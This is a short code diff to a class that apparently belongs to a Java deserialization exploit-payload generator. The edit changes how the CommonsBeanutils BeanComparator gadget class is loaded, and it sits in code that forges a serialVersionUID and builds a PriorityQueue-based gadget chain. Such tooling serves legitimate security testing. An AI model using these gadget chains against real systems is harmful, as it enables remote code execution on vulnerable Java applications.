@@ -25,7 +25,13 @@ public class CommonsBeanutils1183NOCC implements ObjectPayload<Object>
 		CtClass ctClass = Config.POOL.get("org.apache.commons.beanutils.BeanComparator");
 		CtClassUtils.insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");
 
-		Class                       beanCompareClazz = ctClass.toClass();
+		Class beanCompareClazz;
+		try {
+			// Check if class is already loaded
+			beanCompareClazz = Class.forName("org.apache.commons.beanutils.BeanComparator");
+		} catch (ClassNotFoundException e) {
+			beanCompareClazz = ctClass.toClass();
+		}
 		BeanComparator              comparator       = (BeanComparator) beanCompareClazz.newInstance();
 		final PriorityQueue<Object> queue            = new PriorityQueue<Object>(2, comparator);
 		queue.add("1");
